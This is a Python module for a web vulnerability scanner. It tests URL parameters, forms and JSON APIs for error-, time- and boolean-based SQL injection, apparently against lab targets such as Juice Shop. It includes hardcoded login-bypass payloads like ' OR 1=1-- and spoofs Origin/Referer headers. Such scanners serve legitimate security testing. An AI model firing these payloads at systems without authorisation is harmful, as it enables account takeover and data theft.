import time
import json
import traceback
from typing import Optional, List
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import requests

from scanner_core.scanner import Vulnerability
from .base_tester import BaseTester


class SqliTester(BaseTester):
    def __init__(self, session: requests.Session, config: dict):
        super().__init__(session, config)
        self.error_payloads = self.config.get('error_based_payloads', [])
        self.time_payloads = self.config.get('time_based_payloads', [])
        self.boolean_payloads = self.config.get('boolean_based_payloads', [])
        self.error_patterns = self.config.get('error_patterns', [])
        self.time_delay_threshold = self.config.get('time_delay_seconds', 4)

    def test(self, url: str) -> List[Vulnerability]:
        # Giữ nguyên logic cũ cho GET request thuần
        vulns = []
        parsed_url = urlparse(url)
        if not parsed_url.query: return vulns

        query_params = parse_qs(parsed_url.query)
        base_response = self.fetch(url)
        if not base_response: return vulns

        for param in query_params:
            original_value = query_params[param]

            for payload in self.error_payloads:
                try:
                    resp = self._inject_payload(parsed_url, query_params, param, payload)
                    if resp and any(err.lower() in resp.text.lower() for err in self.error_patterns):
                        safe_val = "123456"
                        safe_resp = self._inject_payload(parsed_url, query_params, param, safe_val)
                        if not (any(err.lower() in safe_resp.text.lower() for err in
                                    self.error_patterns) if safe_resp else False):
                            vulns.append(Vulnerability(type='SQL Injection', subcategory='Error-Based', url=url,
                                                       details={'parameter': param, 'payload': payload,
                                                                'evidence': 'SQL error message appeared with payload but disappeared with safe input.'},
                                                       severity='High'))
                            break
                except requests.RequestException:
                    continue

            for payload in self.time_payloads:
                try:
                    start_time = time.time()
                    self._inject_payload(parsed_url, query_params, param, payload)
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.time_delay_threshold:
                        start_verify = time.time()
                        self._inject_payload(parsed_url, query_params, param, str(original_value[0]))
                        elapsed_verify = time.time() - start_verify
                        if elapsed_verify < 2:
                            vulns.append(Vulnerability(type='SQL Injection', subcategory='Time-Based', url=url,
                                                       details={'parameter': param, 'payload': payload,
                                                                'response_time_payload': f'{elapsed_time:.2f}s',
                                                                'response_time_normal': f'{elapsed_verify:.2f}s',
                                                                'evidence': 'Server response was significantly delayed by the payload.'},
                                                       severity='High'))
                            break
                except requests.RequestException:
                    continue

            for payload_pair in self.boolean_payloads:
                true_payload = payload_pair.get('true', "' AND 1=1--")
                false_payload = payload_pair.get('false', "' AND 1=2--")
                try:
                    resp_true = self._inject_payload(parsed_url, query_params, param, true_payload)
                    resp_false = self._inject_payload(parsed_url, query_params, param, false_payload)

                    if resp_true and resp_false:
                        sim_true = self._calculate_similarity(base_response.text, resp_true.text)
                        sim_false = self._calculate_similarity(base_response.text, resp_false.text)

                        len_true = len(resp_true.content)
                        len_false = len(resp_false.content)

                        is_vulnerable = False
                        evidence_msg = ""

                        if (sim_true > 0.95 and sim_false < 0.90):
                            is_vulnerable = True
                            evidence_msg = 'Response text differs significantly between TRUE and FALSE logic.'
                        elif (abs(len_true - len(base_response.content)) < 150) and (abs(len_true - len_false) > 150):
                            is_vulnerable = True
                            evidence_msg = f'Response length differs significantly: TRUE ({len_true} bytes) vs FALSE ({len_false} bytes).'
                        elif resp_true.status_code == 200 and resp_false.status_code >= 400:
                            is_vulnerable = True
                            evidence_msg = f'HTTP Status changed: TRUE ({resp_true.status_code}) vs FALSE ({resp_false.status_code}).'

                        if is_vulnerable:
                            vulns.append(Vulnerability(
                                type='SQL Injection', subcategory='Boolean-Based', url=url,
                                details={'parameter': param, 'true_payload': true_payload,
                                         'false_payload': false_payload, 'evidence': evidence_msg},
                                severity='High'
                            ))
                            break
                except requests.RequestException:
                    continue
        return vulns

    def test_form(self, form_data: dict) -> List[Vulnerability]:
        vulns = []
        try:
            url = form_data['url']
            method = form_data.get('method', 'POST').upper()
            inputs = form_data['inputs']
            is_api = form_data.get('is_api', False) or any(
                k in url.lower() for k in ['/api/', '/rest/', '/v1/', '/v2/'])
            captured_headers = form_data.get('headers', {})

            print(f"  [DEBUG-SQLI] Analyzing Endpoint: {method} {url} (Is API: {is_api})", flush=True)

            base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api, captured_headers)
            if base_resp is None:
                return vulns

            base_status = base_resp.status_code
            base_len = len(base_resp.content)

            for target_input in inputs:
                if target_input.get('type') in ['hidden', 'submit', 'radio', 'button']: continue
                param = target_input['name']

                # --- 1. AUTH BYPASS VERIFICATION ---
                if is_api and method == 'POST':
                    auth_bypass_payloads = ["' OR 1=1--", "admin@juice-sh.op'--", "') OR ('1'='1", "' OR true--"]
                    for payload in auth_bypass_payloads:
                        try:
                            resp = self._inject_form_payload(url, method, inputs, param, payload, is_api,
                                                             captured_headers)
                            if resp is not None:
                                if resp.status_code in [200, 201]:
                                    if any(k in resp.text.lower() for k in
                                           ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
                                        bad_resp = self._inject_form_payload(url, method, inputs, param, "' AND 1=2--",
                                                                             is_api, captured_headers)
                                        if bad_resp is not None and bad_resp.status_code in [401, 403, 404, 500]:
                                            print(f"  [DEBUG-SQLI] !!! SQLI AUTH BYPASS SUCCESS on {param} !!!",
                                                  flush=True)
                                            vulns.append(Vulnerability(
                                                type='SQL Injection', subcategory='Authentication Bypass (API)',
                                                url=url,
                                                details={'parameter': f"JSON Body: {param}", 'payload': payload,
                                                         'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'},
                                                severity='Critical'
                                            ))
                                            break
                        except requests.RequestException:
                            pass

                # --- 2. BOOLEAN-BASED VERIFICATION ---
                for payload_pair in self.boolean_payloads:
                    true_payload = payload_pair.get('true', "' AND 1=1--")
                    false_payload = payload_pair.get('false', "' AND 1=2--")
                    try:
                        resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api,
                                                              captured_headers)
                        resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api,
                                                               captured_headers)

                        if resp_true is not None and resp_false is not None:
                            sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                            sim_false = self._calculate_similarity(base_resp.text, resp_false.text)
                            len_true, len_false = len(resp_true.content), len(resp_false.content)

                            is_vulnerable = False
                            evidence_msg = ""

                            if (sim_true > 0.95 and sim_false < 0.90):
                                is_vulnerable = True
                                evidence_msg = 'Response text differs significantly between TRUE and FALSE logic.'
                            elif is_api and (abs(len_true - base_len) < 150) and (abs(len_true - len_false) > 150):
                                is_vulnerable = True
                                evidence_msg = f'API response length differs significantly: TRUE ({len_true} bytes) vs FALSE ({len_false} bytes).'
                            elif resp_true.status_code == 200 and resp_false.status_code >= 400:
                                is_vulnerable = True
                                evidence_msg = f'HTTP Status changed: TRUE ({resp_true.status_code}) vs FALSE ({resp_false.status_code}).'

                            if is_vulnerable:
                                print(f"  [DEBUG-SQLI] !!! SQLI BOOLEAN-BASED SUCCESS on {param} !!!", flush=True)
                                vulns.append(Vulnerability(
                                    type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
                                    details={'parameter': f"Body/Query: {param}", 'true_payload': true_payload,
                                             'false_payload': false_payload, 'evidence': evidence_msg},
                                    severity='Critical'
                                ))
                                break
                    except requests.RequestException:
                        pass

                # --- 3. ERROR-BASED VERIFICATION ---
                for payload in self.error_payloads:
                    try:
                        resp = self._inject_form_payload(url, method, inputs, param, payload, is_api, captured_headers)
                        if resp is not None and any(err.lower() in resp.text.lower() for err in self.error_patterns):
                            safe_resp = self._inject_form_payload(url, method, inputs, param, "123456", is_api,
                                                                  captured_headers)
                            has_error_safe = any(err.lower() in safe_resp.text.lower() for err in
                                                 self.error_patterns) if safe_resp is not None else False
                            if not has_error_safe:
                                print(f"  [DEBUG-SQLI] !!! SQLI ERROR-BASED SUCCESS on {param} !!!", flush=True)
                                vulns.append(Vulnerability(
                                    type='SQL Injection', subcategory=f'Error-Based ({method})', url=url,
                                    details={'parameter': param, 'payload': payload,
                                             'evidence': 'SQL error message appeared.'}, severity='High'))
                                break
                    except requests.RequestException:
                        continue

                # --- 4. TIME-BASED VERIFICATION [ĐÃ BỔ SUNG CHO FORM] ---
                for payload in self.time_payloads:
                    try:
                        start_time = time.time()
                        self._inject_form_payload(url, method, inputs, param, payload, is_api, captured_headers)
                        elapsed_time = time.time() - start_time

                        if elapsed_time > self.time_delay_threshold:
                            # Đo thời gian của payload chuẩn
                            start_verify = time.time()
                            safe_val = next((i.get('value', '1') for i in inputs if i['name'] == param), '1')
                            self._inject_form_payload(url, method, inputs, param, safe_val, is_api, captured_headers)
                            elapsed_verify = time.time() - start_verify

                            if elapsed_verify < 2:
                                print(f"  [DEBUG-SQLI] !!! SQLI TIME-BASED SUCCESS on {param} !!!", flush=True)
                                vulns.append(Vulnerability(
                                    type='SQL Injection', subcategory=f'Time-Based ({method})', url=url,
                                    details={'parameter': param, 'payload': payload,
                                             'response_time_payload': f'{elapsed_time:.2f}s',
                                             'response_time_normal': f'{elapsed_verify:.2f}s',
                                             'evidence': 'Server response was significantly delayed.'},
                                    severity='High'))
                                break
                    except requests.RequestException:
                        continue

        except Exception as e:
            print(f"  [DEBUG-SQLI-CRASH] Exception in test_form: {e}", flush=True)
            traceback.print_exc()

        return vulns

    def _inject_payload(self, parsed_url, params, target_param, payload):
        test_params = params.copy()
        test_params[target_param] = payload
        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
        return self.session.get(test_url, timeout=10, verify=False, headers={'ngrok-skip-browser-warning': 'true'})

    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api=False, extra_headers=None):
        data = {}
        for inp in inputs:
            if target_param and inp['name'] == target_param:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp.get('value', 'test')

        headers = {
            'ngrok-skip-browser-warning': 'true',
            'Accept': 'application/json, text/plain, */*'
        }

        # Bổ sung Origin và Referer để chống CORS/CSRF block
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        headers['Origin'] = base_url
        headers['Referer'] = f"{base_url}/"

        if extra_headers:
            headers.update(extra_headers)

        try:
            if method == 'GET':
                return self.session.get(url, params=data, timeout=10, verify=False, headers=headers)

            if is_api:
                headers['Content-Type'] = 'application/json'
                if method == 'PUT':
                    return self.session.put(url, json=data, timeout=10, verify=False, headers=headers)
                elif method == 'PATCH':
                    return self.session.patch(url, json=data, timeout=10, verify=False, headers=headers)
                elif method == 'DELETE':
                    return self.session.delete(url, json=data, timeout=10, verify=False, headers=headers)
                return self.session.post(url, json=data, timeout=10, verify=False, headers=headers)
            else:
                return self.session.post(url, data=data, timeout=10, verify=False, headers=headers)
        except Exception as e:
            return None